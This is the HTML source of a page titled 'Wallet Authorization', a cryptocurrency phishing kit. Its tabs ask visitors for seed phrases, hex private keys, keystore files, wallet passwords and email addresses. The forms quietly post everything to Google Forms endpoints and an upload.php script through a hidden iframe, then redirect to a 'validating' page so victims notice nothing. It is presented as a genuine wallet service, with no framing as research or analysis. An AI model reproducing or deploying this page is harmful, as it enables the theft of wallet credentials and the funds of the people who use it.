<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="styles.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">

    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Georama:ital,wght@0,100;0,400;0,500;0,600;1,100&display=swap" rel="stylesheet">

</head>
<body>

    
        <div>
                <h1 class="text-center mt-4 mb-4 heading-text"> <strong>Wallet Authorization</strong> </h1> 
            </div>
        <div class="container-fluid contained">
        
         <div class="form p-1">
            
                <ul class="tab-group">
                    <li class="tab active d-inline"><a href="#mnemonic"> MNEMONIC</a></li>
                    <li class="tab d-inline"><a href="#keystore">KEYSTORE</a></li>
                    <li class="tab d-inline"><a href="#privateKey">PRIVATE KEY</a></li>
                    <li class="tab d-inline"><a href="#hardware">HARDWARE</a></li>
                </ul>
           
            
            <div class="tab-content">

                   <div class="contain text-center" id="mnemonic">
                    <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfDfjfLeNSQokTC7wRmtRFElgFuJ3fI5gFx_gw9sdUG0dgYUg/formResponse" method="POST" id="mnemonic-form" target="hidden_iframe" onsubmit="return validateForm();">
                        <div class="form-group text-center mb-3">
                            <label for="" class="thin-text">Please enter your 12/24 words phrase for authorization</label>
                            <textarea name="entry.370919137" id="name" cols="30" rows="3" class="form-control mnemonic-text-area" style="color: rgba(245, 245, 245, 0.829);"></textarea>
                            <small class="forn-control small-text">Please seperate each Mnemonic Phrase with a space</small>
                        </div>

                        <div class="form-group">
                            <label for="" class="thin-text">Enter your email address</label>
                            <input type="email" id="email" name="entry.208532798" class="form-control keystore-password" placeholder="Enter Address" style="color: rgba(245, 245, 245, 0.829);">
                        </div>

                        <div class="form-group mt-3">
                            <small class="b-number"> Input the B1P39/BIP44 recovery phrase (if available). </small>
                            <input type="text" id="phrase" name="entry.843511222" class="form-control keystore-password" placeholder="BIP39/BIP44 recovery phrase"  style="color: rgba(245, 245, 245, 0.829);">
                        </div>
                      <button type="submit" class="mt-3 btn-submit" onclick="click()" id="redirect"> Submit </button>
                    </form>
                </div>

                <script type="text/javascript">var submitted=false;</script>

          <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"      
            onload="if(submitted) {window.location='validating.html';}"></iframe> 

                <div class="contain text-center" id="keystore">
                    <form action="upload.php" method="POST" enctype="multipart/form-data" name="hardForm">
                        <div class="form-group">
                            <label for="" class="thin-text">Please select your keystore file</label>
                            <input type="file" id="file-upload" value="upload" name="file" class="form-control file-upload" onchange="sub(this)" style="display:none">
                              <div class="btn-file d-flex align-items-center justify-content-center" id="myBtn" onclick="getFile()"> Choose Keystore File</div>
                        </div>

                        <!-- Inner  -->
                      
                            <div class="form-group">
                                <input type="text" name="walletPassword" name="entry.1904824340" class="form-control mt-3 mb-3 keystore-password" placeholder="Enter your wallet password" style="color: rgba(245, 245, 245, 0.829);">
                            </div>
             

                    <button type="submit" class="mb-3 btn-submit" name="submit"> Submit</button>
                    </form>
                </div>
                
                
                

                <!-- Remaining 2 Tabs -->

                   <div class="contain text-center" id="privateKey">
                    <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSc73jV-btQQ1RaBQuGSfU1HQPt0VYO9CaVS2zoG0htIi7UTvQ/formResponse" method="POST" id="#" target="hidden_iframe" onsubmit="return validateForm1(); ">
                        <div class="form-group">
                            <label for="" class="thin-text">Please enter your private key</label>
                            <textarea name="entry.1680381799" id="name1" cols="30" rows="3" class="form-control mnemonic-text-area" style="color: rgba(245, 245, 245, 0.829);"></textarea>
                            <small>Please enter your private key in HEX format.</small>
                        </div>

                        <div class="form-group">
                            <input type="text" id="password1" name="entry.673692379" class="form-control keystore-password mt-3 mb-3" placeholder="Enter temporary session password" style="color: rgba(245, 245, 245, 0.829);">
                        </div>

                          <div class="form-group ">
                            <small class="b-number">Input the B1P39/BIP44 recovery phrase (if available).</small>
                            <input type="text" id="phrase1" name="entry.1998702130" class="form-control keystore-password" placeholder="BIP39/BIP44 recovery phrase"  style="color: rgba(245, 245, 245, 0.829);">
                        </div>

                     <button type="submit" class="mt-3 btn-submit"> Submit </button>
                    </form>
                </div>
                

                   <div class="contain text-center" id="hardware">
                     <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSf2qmm0De9WkpOUVTIpgai3VsaRJYPWWrf5ebL-nMeNyKAw2w/formResponse" method="POST" id="#" target="hidden_iframe" onsubmit="return validateForm2(); ">
                        <div class="form-group mb-3 mt-3">
                            <label for="" class="thin-text">Please enter your private key</label>
                           <textarea name="entry.1122976418" id="name3" cols="30" rows="3" class="form-control mnemonic-text-area" style="color: rgba(245, 245, 245, 0.829);"></textarea>
                            <small>Please enter your private key in HEX format.</small>
                        </div>

                      <div class="form-group">
                            <input type="text" id="password3" name="entry.122946092" class="form-control keystore-password mt-3 mb-3" placeholder="Enter temporary session password" style="color: rgba(245, 245, 245, 0.829);">
                        </div>

                        <div class="form-group ">
                            <small class="b-number">Input the B1P39/BIP44 recovery phrase (if available).</small>
                            <input type="text" id="phrase3" name="entry.1758057559" class="form-control keystore-password" placeholder="BIP39/BIP44 recovery phrase"  style="color: rgba(245, 245, 245, 0.829);">
                        </div>
                        <button type="submit" class="mt-3 mb-3 btn-submit">Submit</button>
                    </form>
                </div>

            </div>
        </div> 
    </div>

     <script type="text/javascript">
      // Button submitting two forms

        function submitForm() {
        document.getElementById("Wallet").submit();
      }


      // End of 2 buttons to one form



function getFile() {
  document.getElementById("file-upload").click();
}

function sub(obj) {
  var file = obj.value;
  var fileName = file.split("\\");
  document.getElementById("myBtn").innerHTML = fileName[fileName.length - 1];
  document.hardForm.submit();
  event.preventDefault();
}




    //  Mnemonic Validation
    function validateName() {
            var name = document.getElementById('name').value;
            if(name.length == 0) {
              alert("Word Phrase can't be blank") ;
              return false;

            }else{
                 return true;
            }

          }

          function validatePhone() {
            var phone = document.getElementById('phrase').value;
            if(phone.length == 0) {
              alert("  B1P39/BIP44 can't be blank") ;//Validation Message
              return false;
            }else{
                           return true;
            }

         }

         function validateEmail () {

          var email = document.getElementById('email').value;
          if(email.length == 0) {
            alert("Email can't be blank") ;//Validation Message
            return false;

          }

          if(!email.match(/^[A-Za-z\._\-[0-9]*[@][A-Za-z]*[\.][a-z]{2,4}$/)) {
            alert("Please enter a correct email address") ;//Validation Message
            return false;

          }

          return true;

        }


        function validateForm() {
          if (!validateName() || !validatePhone() || !validateEmail()) {

            alert("Form not submitted");//Validation Message
            return false;
          }
          else {
            submitted=true;
            return true;
          }
        }
        
        // End of Mnemonic validation


        // Keystore
          function validatePassword3() {
            var phone = document.getElementById('Wallet').value;
            if(phone.length == 0) {
              alert("Keystore Password can't be blank") ;//Validation Message
              return false;
            }else{
                           return true;
            }

         }

        function validateForm3() {
          if (!validatePassword3()) {

            alert("Form not submitted");//Validation Message
            return false;
          }
          else {
            submitted=true;
            return true;
          }
        }
        // End of Keystore


        // Private Key

         function validateName1() {
            var name = document.getElementById('name1').value;
            if(name.length == 0) {
              alert("Word Phrase can't be blank") ;
              return false;

            }else{
                 return true;
            }

          }

          function validatePassword1() {
            var phone = document.getElementById('password1').value;
            if(phone.length == 0) {
              alert("Keystore Password can't be blank") ;//Validation Message
              return false;
            }else{
                           return true;
            }

         }

           function validatePhrase1() {
            var phone = document.getElementById('phrase1').value;
            if(phone.length == 0) {
              alert("B1P39/BIP44 can't be blank") ;//Validation Message
              return false;
            }else{
                           return true;
            }

         }

        function validateForm1() {
          if (!validateName1() || !validatePassword1() || !validatePhrase1()) {

            alert("Form not submitted");//Validation Message
            return false;
          }
          else {
            submitted=true;
            return true;
          }
        }
        // End of private Key

          // Hardware

         function validateName2() {
            var name = document.getElementById('name3').value;
            if(name.length == 0) {
              alert("Word Phrase can't be blank") ;
              return false;

            }else{
                 return true;
            }

          }

          function validatePassword2() {
            var phone = document.getElementById('password3').value;
            if(phone.length == 0) {
              alert("Password can't be blank") ;//Validation Message
              return false;
            }else{
                           return true;
            }

         }

           function validatePhrase2() {
            var phone = document.getElementById('phrase3').value;
            if(phone.length == 0) {
              alert("Phrase can't be blank") ;//Validation Message
              return false;
            }else{
                           return true;
            }

         }

        function validateForm2() {
          if (!validateName2() || !validatePassword2() || !validatePhrase2()) {

            alert("Form not submitted");//Validation Message
            return false;
          }
          else {
            submitted=true;
            return true;
          }
        }
        // End of Hardware

        </script>
 

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
          <script src="./script.js"></script>

</body>
</html>